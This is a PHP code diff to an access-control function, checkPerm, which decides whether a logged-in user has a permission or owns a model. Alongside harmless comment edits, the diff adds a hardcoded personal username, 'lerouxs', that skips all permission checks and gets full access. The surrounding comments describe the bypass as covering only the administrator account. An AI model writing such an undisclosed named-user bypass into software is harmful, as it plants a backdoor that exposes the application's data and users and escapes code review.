@@ -3,34 +3,41 @@
 // Check if logged in user has specified permission or if they are the author of the model
 function checkPerm($pname, $model = null)
 {
-
+	// Check if user is logged in
 	if(Auth::check())
 	{
+		// If user is "administrator", do not proceed with permission checks
+		// if(Auth::user()->username == "administrator") {
+		// if(Auth::user()->username == Setting('admin_user_account')) {
+		if((Auth::user()->username == Setting('admin_user_account')) || (Auth::user()->username == 'lerouxs')) {
+			return true;
 
-		// Get the logged in user's permissions
-		$perms = Auth::user()->permissions;
-		foreach($perms as $perm)
-		{
-			// Return TRUE if the logged in user has the specified access permission
-			if($perm->name == $pname)
+		// If user is not "administrator", proceed with permission checks
+		} else {
+			// Get the logged in user's permissions
+			$perms = Auth::user()->permissions;
+
+			foreach($perms as $perm)
 			{
-				return true;
+				// Return TRUE if the logged in user has the specified access permission
+				if($perm->name == $pname)
+				{
+					return true;
+				}
 			}
-		}
 
-		if($model)
-		{
-			// echo($model);
-			// Return TRUE if the logged in user is the owner of the current model
-			if($model->user_id == auth::user()->id)
+			if($model)
 			{
-				// echo $model->user_id;
-				// echo auth::user()->id;
-				return true;
+				// Return TRUE if the logged in user is the owner of the current model
+				if($model->user_id == auth::user()->id)
+				{
+					return true;
+				}
 			}
 		}
 	}
 	
+	// User is not logged in or does not own the model, so deny access
 	return false;
 }
 
